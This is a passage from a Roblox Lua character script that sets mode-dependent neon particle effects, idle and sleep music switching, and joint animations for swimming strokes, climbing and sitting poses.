Color = Color3.new(0,0,0),
EndColor = Color3.fromRGB(0,155+100*math.sin(sine/10),155+100*math.sin(sine/10)),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(.1,0,.1),
EndSize = Vector3.new(.1,2.5,.1),
Material = "Neon",
Reflectance = 0,
}
)
elseif ModeOfCharacter == "Inexplicable" then
local rdm1 = math.random(-10,10)
local rdm2 = math.random(-10,10)
DerpzEff("Sphere",
{
--Put tween info here, Don't use TweenInfo
Time = .5,
EasingStyle = "Back",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(rdm1,7,rdm2)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
EndCFrame = RootPart.CFrame*CFrame.new(rdm1,-3,rdm2)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
Color = Color3.new(0.333333, 1, 1),
EndColor = Color3.fromRGB(0, 0, 127),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(.1,0,.1),
EndSize = Vector3.new(.1,2.5,.1),
Material = "Neon",
Reflectance = 0,
}
)
delay(.25,function()
DerpzEff("Sphere",
{
--Put tween info here, Don't use TweenInfo
Time = 1,
EasingStyle = "Back",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(rdm1,-3,rdm2)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
EndCFrame = RootPart.CFrame*CFrame.new(rdm1,-3,rdm2)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
Color = Color3.fromRGB(0, 0, 127),
EndColor = Color3.fromRGB(0, 0, 100),
Transparency = .5,
EndTrans = 1,
Size = Vector3.new(.1,.2,.1),
EndSize = Vector3.new(3,.1,3),
Material = "Glass",
Reflectance = 0,
}
)
end)
elseif ModeOfCharacter == "Exstatic" then
local rdm1 = math.random(-10,10)
DerpzEff("Sphere",
{
--Put tween info here, Don't use TweenInfo
Time = 1,
EasingStyle = "Back",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(0 + 7 * math.cos(sine/30),0,0+ 7 * math.sin(sine/30))*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
EndCFrame = RootPart.CFrame*CFrame.new(0 + 7 * math.cos(sine/30),0,0+ 7 * math.sin(sine/30))*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
Color = Color3.fromHSV(boop(counter),1,DerpzMusic.PlaybackLoudness/500),
EndColor = Color3.fromHSV(boop(counter),1,DerpzMusic.PlaybackLoudness/500),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(0,0,0),
EndSize = Vector3.new(DerpzMusic.PlaybackLoudness/100,DerpzMusic.PlaybackLoudness/100,DerpzMusic.PlaybackLoudness/100),
Material = "Neon",
Reflectance = 0,
}
)
elseif ModeOfCharacter == "Decorumed" then
DerpzEff("Block",
{
--Put tween info here, Don't use TweenInfo
Time = .5,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = tors.CFrame*CFrame.new(4*math.cos(sine/20),2*math.cos(sine/40),4*math.sin(sine/20))*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),
EndCFrame = tors.CFrame*CFrame.new(4*math.cos(sine/20),2*math.cos(sine/40),4*math.sin(sine/20))*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),
Color = Color3.new(0,0,0),
EndColor = Color3.fromRGB(255,255,255),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(.1,0,.1),
EndSize = Vector3.new(1,1,1),
Material = "Neon",
Reflectance = 0,
}
)
DerpzEff("Block",
{
--Put tween info here, Don't use TweenInfo
Time = .5,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = tors.CFrame*CFrame.new(-4*math.cos(sine/20),-2*math.cos(sine/40),-4*math.sin(sine/20))*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),
EndCFrame = tors.CFrame*CFrame.new(-4*math.cos(sine/20),-2*math.cos(sine/40),-4*math.sin(sine/20))*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),
Color = Color3.fromRGB(255,255,255),
EndColor = Color3.new(0,0,0),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(.1,0,.1),
EndSize = Vector3.new(1,1,1),
Material = "Neon",
Reflectance = 0,
}
)
elseif ModeOfCharacter == "Atmospherical" then
DerpzEff("Sphere",
{
--Put tween info here, Don't use TweenInfo
Time = 1,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = larm.CFrame*CFrame.new(0,-1,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),
EndCFrame = larm.CFrame*CFrame.new(0,-1.5,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),
Color = Color3.fromRGB(0,150,255),
EndColor = Color3.fromRGB(0,50,100),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(.1,0,.1),
EndSize = Vector3.new(1,3,1),
Material = "Neon",
Reflectance = 0,
}
)
end
--WACKYEFFECT({
--Time = 30, -- Time. Duh
--EffectType = "Sphere", -- Effect Type. Effect Types: "Box", "Wedge", "Sphere", "Ring", "Wave", "Slash", "Swirl", "Round Slash", "Skull", "Crystal"
--Size = VT(0.01,0.01,0.01), -- Start Size
--Size2 = VT(0.3, math.random(3,6), 0.3), -- End Size
--Transparency = 0.4,-- Start Transparency
--Transparency2 = 1, -- End Transparency
--CFrame = root.CFrame*CFrame.new(math.random(-6,6),-3,math.random(-6,6))*CFrame.Angles(math.rad(0 + math.random(-3,3)),math.rad(math.random(-3,3)),math.rad(math.random(-3,3))), -- Start CFrame
--MoveToPos = nil, -- Move to position. You must add .p at the end of a cframe. Do not use angles
--RotationX = 0, -- Rotation X
--RotationY = 0, -- Rotation Y
--RotationZ = 0, -- Rotation Z
--Material = "Neon", -- Material
--Color = Color3.fromRGB(0,155+100*math.cos(sine/40),155+100*math.cos(sine/40)), -- Color (NOT BRICKCOLOR)
--SoundID = nil, -- Sound that plays while effect is being done
--SoundPitch = 0, -- Pitch
--SoundVolume = 10, -- Vol
--UseBoomerangMath = false, -- Boomerang Enabled
--Boomerang = 0, -- Makes it come back to start position
--SizeBoomerang = 50 -- Makes it come back to start size
--})
end
end))
if tired == false then
particles.Enabled = false
--Happy()
DerpzMusic:Resume()
sleepymusic:Pause()
elseif tired == true then
particles.Enabled = true
--Sleeping()
sleepymusic:Resume()
DerpzMusic:Pause()
end
if equipped==true or equipped==false then
if attack==false and Anim == "Idle" then
idle=idle+1
else
idle=0
tired = false
end
if idle>=30000 then
if attack==false then
tired = true
end
end

if hum:GetState() == Enum.HumanoidStateType.Swimming and torvel<1 and hum.Sit ~= true then
Anim="SwimIdle"
if attack == false then
youredead = false
local Alpha = .3
if SwimType ~= "ICANTSWIMIMUSEDTOFLYING" then
hum.WalkSpeed = storehumanoidWS
local rm = math.random(1,100)
if rm == 1 then
--soundeffect(357616080,0.95,hed,10,0,"HELP")
else end

local Alpha = 0.2
RootJoint.C0 = RootJoint.C0:lerp(CFrame.new(0+0.1*math.cos(sine/54),0+0.1*math.cos(sine/63),0+0.05*math.cos(sine/65))*CFrame.Angles(math.rad(5+3*math.cos(sine/25)),math.rad(5),math.rad(1*math.cos(sine/27)))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(CFrame.new(-1.02,-1,0)*CFrame.Angles(math.rad(15+50*math.cos(sine/20)),math.rad(2),math.rad(-3))*CFrame.Angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(CFrame.new(1.05,-0.7,-0.5)*CFrame.Angles(math.rad(-10+-40*math.cos(sine/20)),math.rad(-10),math.rad(3))*CFrame.Angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(CFrame.new(-1.6+0.15*math.sin(sine/30),0.6+-0.05*math.cos(sine/25),-0.1+-0.3*math.sin(sine/30))*CFrame.Angles(math.rad(80+-5*math.cos(sine/25)),math.rad(-20+10*math.cos(sine/30)),math.rad(-10+40*math.sin(sine/30)))*LeftShoulderC0,Alpha)
RW.C0 = RW.C0:lerp(CFrame.new(1.6+-0.15*math.sin(sine/30),0.6+-0.05*math.cos(sine/25),-0.1+-0.3*math.sin(sine/30))*CFrame.Angles(math.rad(80+-5*math.cos(sine/25)),math.rad(20+-10*math.cos(sine/30)),math.rad(10+-40*math.sin(sine/30)))*RightShoulderC0,Alpha)
Neck.C0 = Neck.C0:lerp(necko*CFrame.new(0,0,0)*CFrame.Angles(math.rad(7+5*math.cos(sine/25)),math.rad(-3+1*math.sin(sine/25)),math.rad(-7+3*math.cos(sine/30))),Alpha)

elseif SwimType == "ICANTSWIMIMUSEDTOFLYING" then
local rm = math.random(1,30)
if rm == 1 then
soundeffect(357616080,0.95,hed,10,0,"HELP")


else end
--Static1:Resume()
hum.WalkSpeed = 0
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1,-0.1)*angles(math.rad(11.2),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.5,-0.6)*angles(math.rad(-24.8),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.4,0.6,-0.1)*angles(math.rad(160),math.rad(-15.8),math.rad(-53.9 + 40 * math.cos(sine/9))),Alpha)
RW.C0 = RW.C0:lerp(cf(1.7,0.5,-0.1)*angles(math.rad(160),math.rad(19),math.rad(43.1 - 40 * math.cos(sine/11))),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0,-0.7)*angles(math.rad(40),math.rad(0),math.rad(0))*necko,.1)
end
end
elseif hum:GetState() == Enum.HumanoidStateType.Swimming and torvel>1 and hum.Sit ~= true then
Anim="Swim"
local rm = math.random(1,150)
if rm == 1 then
soundeffect(357616080,0.95,hed,1,0,"HELP")
else end
if attack == false then
hum.WalkSpeed = 16
local Alpha = .3
if SwimType == 1 then
--Front crawl
aerrtee = aerrtee - 2.875
hum.WalkSpeed = 16

local Alpha = 0.1
RootJoint.C0 = RootJoint.C0:lerp(CFrame.new(0,0+0.05*math.cos(sine/5),0)*CFrame.Angles(math.rad(-3),math.rad(0+5*math.cos(sine/15)),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(CFrame.new(-1.05,-1.1+0.05*math.sin(sine/7.5),0+0.2*math.sin(sine/7.5))*CFrame.Angles(math.rad(0+-40*math.cos(sine/7.5)),math.rad(5),math.rad(-3))*CFrame.Angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(CFrame.new(1.05,-1.1+0.05*math.sin(sine/7.5),0+0.2*math.sin(sine/7.5))*CFrame.Angles(math.rad(0+40*math.cos(sine/7.5)),math.rad(-5),math.rad(3))*CFrame.Angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(CFrame.new(-1.5,0.8+0.7*math.cos(sine/10),0+-0.6*math.sin(sine/10))*CFrame.Angles(math.rad(130+-100*math.sin(sine/10)),math.rad(-50+-30*math.sin(sine/10)),math.rad(-30+-50*math.sin(sine/10)))*LeftShoulderC0,Alpha)
RW.C0 = RW.C0:lerp(CFrame.new(1.5,0.8+-0.7*math.cos(sine/10),0+0.6*math.sin(sine/10))*CFrame.Angles(math.rad(130+100*math.sin(sine/10)),math.rad(50+-30*math.sin(sine/10)),math.rad(30+-50*math.sin(sine/10)))*RightShoulderC0,Alpha)
Neck.C0 = Neck.C0:lerp(necko*CFrame.new(0,0,0)*CFrame.Angles(math.rad(-40+-3*math.sin(sine/15)),math.rad(0+5*math.cos(sine/15)),math.rad(0+-5*math.cos(sine/15))),Alpha)
elseif SwimType == 2 then
--Back stroke
aerrtee = aerrtee + 360/50
hum.WalkSpeed = 16


local Alpha = 0.1
RootJoint.C0 = RootJoint.C0:lerp(CFrame.new(0,0+0.05*math.cos(sine/5),0)*CFrame.Angles(math.rad(-10),math.rad(180+5*math.cos(sine/15)),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(CFrame.new(-1.05,-1.1+0.05*math.sin(sine/7.5),0+0.2*math.sin(sine/7.5))*CFrame.Angles(math.rad(0+40*math.cos(sine/7.5)),math.rad(5),math.rad(-3))*CFrame.Angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(CFrame.new(1.05,-1.1+0.05*math.sin(sine/7.5),0+0.2*math.sin(sine/7.5))*CFrame.Angles(math.rad(0+-40*math.cos(sine/7.5)),math.rad(-5),math.rad(3))*CFrame.Angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(CFrame.new(-1.5,0.6+-0.7*math.cos(sine/7.5),0+-0.6*math.sin(sine/7.5))*CFrame.Angles(math.rad(160+-70*math.sin(sine/7.5)),math.rad(0+40*math.cos(sine/7.5)),math.rad(-20+25*math.sin(sine/7.5)))*LeftShoulderC0,Alpha)
RW.C0 = RW.C0:lerp(CFrame.new(1.5,0.6+0.7*math.cos(sine/7.5),0+0.6*math.sin(sine/7.5))*CFrame.Angles(math.rad(160+70*math.sin(sine/7.5)),math.rad(0+-40*math.sin(sine/7.5)),math.rad(20+-25*math.sin(sine/7.5)))*RightShoulderC0,Alpha)
Neck.C0 = Neck.C0:lerp(necko*CFrame.new(0,0,0)*CFrame.Angles(math.rad(40+-3*math.sin(sine/15)),math.rad(0+5*math.cos(sine/15)),math.rad(0+-5*math.cos(sine/15))),Alpha)
elseif SwimType == 3 then
--Butterfly
aerrtee = aerrtee + 360/50
hum.WalkSpeed = 16

local Alpha = 0.1
RootJoint.C0 = RootJoint.C0:lerp(CFrame.new(0,0+0.05*math.sin(sine/5),0)*CFrame.Angles(math.rad(0+-3*math.cos(sine/5)),math.rad(0+5*math.cos(sine/15)),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(CFrame.new(-1.05,-1.1+0.05*math.sin(sine/5),0+-0.2*math.sin(sine/10))*CFrame.Angles(math.rad(0+45*math.cos(sine/5)),math.rad(5),math.rad(-5+-6*math.cos(sine/53)))*CFrame.Angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(CFrame.new(1.05,-1.1+0.05*math.sin(sine/5),0+-0.2*math.sin(sine/10))*CFrame.Angles(math.rad(0+50*math.cos(sine/5)),math.rad(-5),math.rad(4+-3*math.cos(sine/56)))*CFrame.Angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(CFrame.new(-1.5,0.5,0)*CFrame.Angles(math.rad(180-aerrtee),math.rad(0+5*math.cos(sine/15)),math.rad(0))*LeftShoulderC0,Alpha)
RW.C0 = RW.C0:lerp(CFrame.new(1.5,0.5,0)*CFrame.Angles(math.rad(180-aerrtee),math.rad(0+5*math.cos(sine/15)),math.rad(0))*RightShoulderC0,Alpha)
Neck.C0 = Neck.C0:lerp(necko*CFrame.new(0,0,0)*CFrame.Angles(math.rad(-40+-5*math.sin(sine/15)),math.rad(0+5*math.cos(sine/15)),math.rad(0+-5*math.cos(sine/15))),Alpha)
elseif SwimType == 4 then
--Breast Stroke (Don't mind the name, That's actually what it's called.)
coroutine.resume(coroutine.create(function()
if doinglol == false then
doinglol = true

for i = 0, 1, 0.1 do
swait()
if Anim ~= "Swim" then
else
local Alpha = .25
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(10),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.4,-0.6,-0.7)*angles(math.rad(-19.8),math.rad(-5.8),math.rad(15.6))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1.5,-0.5,-0.4)*angles(math.rad(0),math.rad(0),math.rad(-22.8))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1,1.2,-1)*angles(math.rad(141),math.rad(-22.7),math.rad(23.8)),Alpha)
RW.C0 = RW.C0:lerp(cf(0.6,0.8,-1.2)*angles(math.rad(133.9),math.rad(-15.4),math.rad(-15.2)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0,-0.2)*angles(math.rad(5.9),math.rad(0),math.rad(0))*necko,Alpha)
end
end
for i = 0, 1, 0.1 do
swait()
if Anim ~= "Swim" then
else
local Alpha = .3
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(-10),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-0.6,-0.5,0.1)*angles(math.rad(-0.3),math.rad(-8.5),math.rad(-51))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(0.9,-0.7,0)*angles(math.rad(0),math.rad(0),math.rad(40))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.8,1.1,-0.5)*angles(math.rad(141),math.rad(-22.7),math.rad(-45.6)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.4,0.5,-0.2)*angles(math.rad(139.1),math.rad(-4.1),math.rad(66)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0.2,-0.7)*angles(math.rad(28),math.rad(0),math.rad(0))*necko,Alpha)
end
end
for i = 0, 1, 0.1 do
swait()
local Alpha = .1
if Anim ~= "Swim" then
else
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1,0)*angles(math.rad(-0.3),math.rad(-8.5),math.rad(-8.2))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1,0)*angles(math.rad(0),math.rad(0),math.rad(-1.4))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-0.8,0.8,-0.8)*angles(math.rad(141),math.rad(-22.7),math.rad(76.2)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.3,0.6,-0.6)*angles(math.rad(107.2),math.rad(5),math.rad(-49.4)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0.2,-0.7)*angles(math.rad(28),math.rad(0),math.rad(0))*necko,Alpha)
end
end
doinglol = false
else
end
end))

end
end
elseif Humanoid:GetState() == Enum.HumanoidStateType.Climbing and Humanoid.MoveDirection ~= Vector3.new(0,0,0) and hum.Sit ~= true then
Anim = "Climbing"
Humanoid.WalkSpeed = 16
coroutine.resume(coroutine.create(function()
if doinglol == false then

doinglol = true
for i = 0, 2, 0.1 do
swait()
if Anim == "Climbing" then
local Alpha = .2
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0.5,-0.2)*angles(math.rad(-5.1),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-0.5,-0.6)*angles(math.rad(9),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.3,-0.7)*angles(math.rad(11.9),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.4,0.5,0.2)*angles(math.rad(69.8),math.rad(8.4),math.rad(-27.9)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.4,0.2,0.1)*angles(math.rad(104.6),math.rad(-29),math.rad(19.6)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0.1,-0.4)*angles(math.rad(25.5),math.rad(0.6),math.rad(0))*necko,Alpha)
else end
end
Humanoid.WalkSpeed = 25
for i = 0, 3, 0.1 do
if Anim == "Climbing" then
swait()
local Alpha = .25
RootJoint.C0 = RootJoint.C0:lerp(cf(0,3.3,0)*angles(math.rad(-21.5),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1.2,-0.3)*angles(math.rad(-21.2),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1.1,-0.4)*angles(math.rad(-17.6),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,1.5,0.1)*angles(math.rad(168),math.rad(-28.8),math.rad(-3.5)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,1.2,-0.1)*angles(math.rad(179.6),math.rad(-11.2),math.rad(10.4)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0.2,-0.6)*angles(math.rad(34.4),math.rad(0.6),math.rad(-0.1))*necko,Alpha)
else end
end
Humanoid.WalkSpeed = 20
for i = 0, 2, 0.1 do
if Anim == "Climbing" then
swait()
local Alpha = .15
RootJoint.C0 = RootJoint.C0:lerp(cf(0,2.4,-0.2)*angles(math.rad(-3.7),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1.2,-0.3)*angles(math.rad(-21.8),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1.1,-0.4)*angles(math.rad(-49.4),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.6,1.1,-0.1)*angles(math.rad(142.3),math.rad(-25),math.rad(-15.3)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,1,-0.1)*angles(math.rad(170.9),math.rad(32.9),math.rad(-10.5)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0,0.1)*angles(math.rad(-4.4),math.rad(0.6),math.rad(0.3))*necko,Alpha)
else end
end
Humanoid.WalkSpeed = 16
 for i = 0, 2, 0.1 do
if Anim == "Climbing" then
swait()
local Alpha = .3
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0.8,-0.2)*angles(math.rad(5.3),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-0.3,-0.3)*angles(math.rad(15.3),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.6,-0.6)*angles(math.rad(3.8),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.6,0.8,0)*angles(math.rad(87.6),math.rad(-1.3),math.rad(-29)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.4,0.5,0.1)*angles(math.rad(104.3),math.rad(-2.7),math.rad(15.3)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0.1,0.5)*angles(math.rad(-32.9),math.rad(0.3),math.rad(0.5))*necko,Alpha)
else end
end
doinglol = false
else
end
end))
if attack == false then
end
elseif Humanoid.MoveDirection == Vector3.new(0,0,0) and Humanoid:GetState() == Enum.HumanoidStateType.Climbing and attack == false and hum.Sit ~= true then
Anim="ClimbingIdle"
Humanoid.WalkSpeed = storehumanoidWS
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0.5,-0.2)*angles(math.rad(-5.1),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-0.5,-0.6)*angles(math.rad(9),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.3,-0.7)*angles(math.rad(11.9),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.4,0.5,0.2)*angles(math.rad(69.8),math.rad(8.4),math.rad(-27.9)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.4,0.2,0.1)*angles(math.rad(104.6),math.rad(-29),math.rad(19.6)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0.1,-0.4)*angles(math.rad(25.5),math.rad(0.6),math.rad(0))*necko,Alpha)

elseif hum.Sit == true then
Anim="Sitting"
hum.WalkSpeed = storehumanoidWS
if sittingstyle == 1 then
--Sitting on a chair
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0 - 0.1 * math.cos(sine/50),0.1)*angles(math.rad(10.7),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-0.9,-1+ 0.1 * math.cos(sine/50),-0.2)*angles(math.rad(89.5),math.rad(0),math.rad(20.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-0.8+ 0.1 * math.cos(sine/50),-0.4)*angles(math.rad(39.5),math.rad(0),math.rad(-23.6))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1,0.2 +0.1 * math.cos(sine/40),-0.4)*angles(math.rad(54.7),math.rad(0),math.rad(91)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.1,0.1 +0.1 * math.cos(sine/40),-0.2)*angles(math.rad(32.1),math.rad(-19.9),math.rad(-83)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0.1,0,0.3)*angles(math.rad(-16.7),math.rad(0),math.rad(4.6))*necko,Alpha)

elseif sittingstyle == 2 then
--Sitting on a stool
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0 + 0.1 * math.cos(sine/50),0)*angles(math.rad(-10.3),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1.1- 0.1 * math.cos(sine/50),-0.4)*angles(math.rad(54.4),math.rad(5.6),math.rad(-7))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(0.9,-0.7- 0.1 * math.cos(sine/50),-0.2)*angles(math.rad(44.3),math.rad(2.5),math.rad(10.8))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-0.7,0 - 0.1 * math.cos(sine/40),-0.6)*angles(math.rad(48.3),math.rad(8.4),math.rad(90.5)),Alpha)
RW.C0 = RW.C0:lerp(cf(0.8,0.2 - 0.1 * math.cos(sine/40),-0.4)*angles(math.rad(54.2),math.rad(-19),math.rad(-77.1)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(0,0,0)*angles(math.rad(0.1),math.rad(-4.3 - 2 * math.cos(sine/60)),math.rad(2.9))*necko,Alpha)
elseif sittingstyle == 3 then
--Sitting on the floor
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0 + 0.05 * math.cos(sine/50),0)*angles(math.rad(-8.1),math.rad(0),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1.1,-1- 0.1 * math.cos(sine/50),-0.3)*angles(math.rad(89.3),math.rad(0),math.rad(-19.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1- 0.1 * math.cos(sine/50),-0.3)*angles(math.rad(93.4),math.rad(0),math.rad(15.4))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,0.1,0.3)*angles(math.rad(-14.4),math.rad(0),math.rad(0)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.4,0.3,-0.3)*angles(math.rad(38.6),math.rad(0),math.rad(-21.8)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(cf(-0.1,0,-0.1)*angles(math.rad(3.4),math.rad(-0.2),math.rad(-3.7))*necko,.02)
elseif sittingstyle == 4 then
--chill sit
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(28.8),math.rad(0),math.rad(3.8))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-0.9,-1.2,-0.1)*angles(math.rad(24.9),math.rad(19.4),math.rad(27.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1,0)*angles(math.rad(19.1),math.rad(1.5),math.rad(-13.4))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
